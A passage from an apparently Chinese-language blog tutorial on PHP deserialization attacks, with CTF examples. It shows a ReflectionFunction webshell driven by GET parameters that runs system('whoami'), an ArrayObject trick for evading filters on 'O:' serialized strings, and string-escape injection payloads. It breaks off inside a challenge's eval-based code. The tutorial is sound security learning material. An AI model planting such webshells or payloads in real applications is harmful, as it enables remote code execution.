<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&quot;\0lambda_1&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">invoke</span>();</span><br></pre></td></tr></table></figure>

<p>这里用\0lambda_1是由于默认情况下create_function返回的字符串为\0lambda_1</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/reflectionfunction2.png" class="" title="reflectionfunction2">

<p>由于多次试验会造成\0lambda_后跟的数字增加，所以这里用的\0lambda_3来演试，在做题中一般都是\0lambda_1</p>
<p>接下来说说用invokeArgs()来写webshell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public ReflectionFunction::invokeArgs(array $args): mixed</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$args</code>：传递给函数的参数是一个数组，像 <code>call_user_func_array()</code> 的工作方式。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ZL47yY</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;what did you see?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$function</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&#x27;ZL47yY&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$function</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="keyword">array</span>());</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">illy4</span>(<span class="params"><span class="variable">$str1</span>,<span class="variable">$str2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s and %s&quot;</span>, <span class="variable">$str1</span>, <span class="variable">$str2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$function2</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&#x27;illy4&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$function2</span>-&gt;<span class="title function_ invoke__">invokeargs</span>(<span class="keyword">array</span>(<span class="string">&#x27;yes&#x27;</span>,<span class="string">&#x27;no&#x27;</span>));</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/reflectionfunction3.png" class="" title="reflectionfunction3">

<p>其实相当于是执行了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">ZL47yY</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">illy4</span>(<span class="string">&#x27;yes&#x27;</span>,<span class="string">&#x27;no&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>那么如果yes和no部分我们可控会造成什么？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$function</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="variable">$function</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/reflectionfunction4.png" class="" title="reflectionfunction4">

<p>也就是执行了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>参考文章：<a target="_blank" rel="noopener" href="https://drun1baby.top/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/</a></p>
<h3 id="利用ArrayObject绕过O开头序列化字符串"><a href="#利用ArrayObject绕过O开头序列化字符串" class="headerlink" title="利用ArrayObject绕过O开头序列化字符串"></a>利用ArrayObject绕过O开头序列化字符串</h3><p>正常情况下，如下代码 ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>产生的序列化字符串应该为O开头：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;ZLARYY&quot;:3:&#123;s:6:&quot;xiexie&quot;;N;s:11:&quot;*Chesmond&quot;;N;s:13:&quot;ZLARYYArach&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>但如果有些题目不允许O开头的内容传入，我们该怎么绕过呢？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZLARYY</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xiexie</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Chesmond</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Arach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ZLARYY!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZLARYY</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;test&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>));</span><br></pre></td></tr></table></figure>

<p>这样的话产生的序列化字符串为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:11:&quot;ArrayObject&quot;:108:&#123;x:i:0;a:1:&#123;s:4:&quot;test&quot;;O:6:&quot;ZLARYY&quot;:3:&#123;s:6:&quot;xiexie&quot;;N;s:11:&quot;*Chesmond&quot;;N;s:13:&quot;ZLARYYArach&quot;;N;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP序列化字符串以&#x27;O&#x27;和&#x27;C&#x27;开头分别代表普通对象和自定义序列化对象。&#x27;O&#x27;代表普通类实例，结构为 O:长度:&quot;类名&quot;:属性数:&#123;属性&#125;，反序列化时自动触发__wakeup()或__destruct()。&#x27;C&#x27;代表实现了Serializable接口的类，结构为 C:长度:&quot;类名&quot;:数据长度:&#123;数据&#125;，利用serialize()和unserialize()自定义数据格式。 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">具体区别如下：</span><br><span class="line">O (Object):</span><br><span class="line">结构：O:4:&quot;User&quot;:2:&#123;s:2:&quot;id&quot;;i:1;&#125;</span><br><span class="line">特点：序列化所有成员属性，反序列化时会自动触发__wakeup()方法（如果存在）。</span><br><span class="line">C (Custom Object):</span><br><span class="line">结构：C:4:&quot;User&quot;:13:&#123;...自定义数据...&#125;</span><br><span class="line">特点：针对实现了Serializable接口的类，使用自定义的serialize()和unserialize()方法来控制序列化内容，__wakeup()不会被触发。 </span><br></pre></td></tr></table></figure>

<h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><p><strong>字符串逃逸</strong>是指在处理字符串时，通过特定的构造或操作，使得字符串的内容被错误解析或跳过，从而实现意料之外的效果。这种技术常见于反序列化漏洞中，尤其是在PHP等语言中，利用字符串长度的变化或过滤器的处理缺陷，达到修改或注入数据的目的。字符串逃逸分为两种情况：增加和减少</p>
<h3 id="字符串逃逸-增加"><a href="#字符串逃逸-增加" class="headerlink" title="字符串逃逸-增加"></a>字符串逃逸-增加</h3><p>这里选择D0g3三面题目作为例题：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;uname=<span class="variable">$uname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password===<span class="string">&#x27;lu1ux&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&#x27;flag1.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag1</span>;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;hack&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$uname</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&#x27;Eurake&#x27;</span>;</span><br><span class="line"><span class="variable">$ser</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">a</span>(<span class="variable">$uname</span>,<span class="variable">$password</span>)));</span><br><span class="line"><span class="variable">$test</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这道题目中$uname部分我们可控，$password他预先赋值为Eurake，我们要做的就是绕过这个原本的赋值将$password赋值为lu1ux</p>
<p>由于我手上没有题目环境了，所以我把题目稍稍修改了一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;uname=<span class="variable">$uname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password===<span class="string">&#x27;lu1ux&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;flag is ZLARYY&#123;2L47yY&#125;&quot;</span>;     </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;hack&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="string">&#x27;Eurake&#x27;</span>;</span><br><span class="line"><span class="variable">$ser</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="variable">$test</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="comment">//$uname可控</span></span><br></pre></td></tr></table></figure>

<p>当我把uname赋值为php，我们 输出一下序列化字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:3:&quot;hack&quot;;s:8:&quot;password&quot;;s:6:&quot;Eurake&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现了一个奇怪的地方：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:3:&quot;hack&quot;</span><br></pre></td></tr></table></figure>

<p>那么这就是漏洞所在了，s:3的结构导致溢出了一位</p>
<p>那么我们的思路应该是这样：构造新的password序列化字符串包含在uname里面，通过溢出的字符个数来作为实际上会被反序列化的序列化字符串：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//新的password序列化字符串：</span></span><br><span class="line"><span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:5:&quot;</span>lu1ux<span class="string">&quot;;&#125;//这里用&#125;的原因是闭合前面的&#123;，使其成为完整的序列化字符串而不考虑后面</span></span><br><span class="line"><span class="string">//经过计数，一共有30个字符需要溢出</span></span><br></pre></td></tr></table></figure>

<p>那么最终我们的payload中uname需要包含30个php，即：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;uname=<span class="string">&#x27;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:8:&quot;password&quot;;s:5:&quot;lu1ux&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>最终序列化字符串结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:120:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:5:&quot;lu1ux&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;Eurake&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>第一串里面刚好有30个hack对应120，那么我们试试这串payload能不能得到我们想要的结果：</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%A2%9E%E5%8A%A0.png" class="" title="字符串逃逸增加">

<p>成功了，所以字符串逃逸增加的重点就在于我们要把需要的内容作为属性的值传入，同时构造相应长度的字符串来溢出</p>
<h3 id="字符串逃逸-减少"><a href="#字符串逃逸-减少" class="headerlink" title="字符串逃逸-减少"></a>字符串逃逸-减少</h3><p>这里选择2026furryCTF上的babypop题目作为演示 ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecurityProvider</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>, <span class="string">&#x27;..&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Attack Detected&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogService</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$formatter</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handler</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handler = <span class="variable">$handler</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;formatter = <span class="keyword">new</span> <span class="title class_">DateFormatter</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handler &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>-&gt;handler, <span class="string">&#x27;close&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$mode</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$mode</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;path = <span class="variable">$path</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mode = <span class="variable">$mode</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;mode === <span class="string">&#x27;debug&#x27;</span> &amp;&amp; !<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &lt; <span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span 